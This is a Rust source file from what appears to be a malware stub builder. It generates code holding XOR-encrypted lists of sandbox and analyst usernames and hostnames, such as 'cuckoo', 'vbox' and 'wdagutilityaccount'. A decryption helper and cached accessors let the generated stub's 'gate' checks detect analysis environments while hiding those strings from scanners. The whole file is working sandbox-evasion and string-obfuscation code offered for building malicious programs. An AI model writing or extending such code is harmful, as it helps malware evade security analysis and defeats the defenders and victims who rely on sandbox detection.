//! Encrypted config-string emitter. Every blocklist is XOR'd with the
//! per-build key at synth time; the stub decrypts at runtime.
//!
//! Emitted accessors are lowercase functions: `user_blocklist()`,
//! `host_blocklist()`. Gate bodies call these by those exact names.

use rand::Rng;

const USER_BLOCKLIST: &[&str] = &[
    "sandbox", "malware", "virus", "test", "analyst",
    "cuckoo", "admin", "abby", "wdagutilityaccount",
];

const HOST_BLOCKLIST: &[&str] = &[
    "sandbox", "malware", "cuckoo", "vm-", "vbox", "win-", "analysis",
];

pub fn emit_encrypted_strings<R: Rng>(_rng: &mut R, key: &[u8; 32]) -> String {
    let mut s = String::new();

    // XOR key
    s.push_str("static XK: [u8; 32] = [");
    for (i, b) in key.iter().enumerate() {
        if i > 0 { s.push(','); }
        s.push_str(&format!("{:#04x}", b));
    }
    s.push_str("];\n\n");

    s.push_str(&emit_list("USER_BLOCKLIST", "user_blocklist", USER_BLOCKLIST, key));
    s.push_str(&emit_list("HOST_BLOCKLIST", "host_blocklist", HOST_BLOCKLIST, key));
    s
}

fn emit_list(static_name: &str, fn_name: &str, strings: &[&str], key: &[u8; 32]) -> String {
    let mut s = String::new();

    s.push_str("static ");
    s.push_str(static_name);
    s.push_str("_ENC: [&[u8]; ");
    s.push_str(&strings.len().to_string());
    s.push_str("] = [\n");
    for st in strings {
        let enc: Vec<u8> = st.as_bytes().iter().enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect();
        s.push_str("    &[");
        for (i, b) in enc.iter().enumerate() {
            if i > 0 { s.push(','); }
            s.push_str(&format!("{:#04x}", b));
        }
        s.push_str("],\n");
    }
    s.push_str("];\n");

    s.push_str("fn decrypt_");
    s.push_str(fn_name);
    s.push_str("_list() -> Vec<String> {\n");
    s.push_str("    ");
    s.push_str(static_name);
    s.push_str("_ENC.iter().map(|b| {\n");
    s.push_str("        let dec: Vec<u8> = b.iter().enumerate().map(|(i, x)| x ^ xor_key_at(i)).collect();\n");
    s.push_str("        String::from_utf8_lossy(&dec).to_string()\n");
    s.push_str("    }).collect()\n");
    s.push_str("}\n\n");

    s.push_str("static ");
    s.push_str(static_name);
    s.push_str("_CACHE: std::sync::OnceLock<Vec<String>> = std::sync::OnceLock::new();\n");

    s.push_str("fn ");
    s.push_str(fn_name);
    s.push_str("() -> &'static Vec<String> {\n");
    s.push_str("    ");
    s.push_str(static_name);
    s.push_str("_CACHE.get_or_init(decrypt_");
    s.push_str(fn_name);
    s.push_str("_list)\n");
    s.push_str("}\n\n");

    s
}

pub fn emit_decrypt_helper() -> String {
    let mut s = String::new();
    s.push_str("#[inline(always)]\n");
    s.push_str("fn xor_key_at(i: usize) -> u8 {\n");
    s.push_str("    XK[i % XK.len()]\n");
    s.push_str("}\n\n");
    s
}
